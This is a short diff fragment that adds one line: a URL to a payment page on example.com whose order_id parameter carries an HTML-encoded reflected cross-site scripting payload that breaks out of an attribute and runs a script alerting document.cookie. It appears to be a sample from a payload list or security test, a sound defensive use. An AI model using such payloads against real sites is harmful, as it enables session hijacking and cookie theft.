@@ -1,0 +1,2 @@
+http://www.example.com/users/payment.php?order_id=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
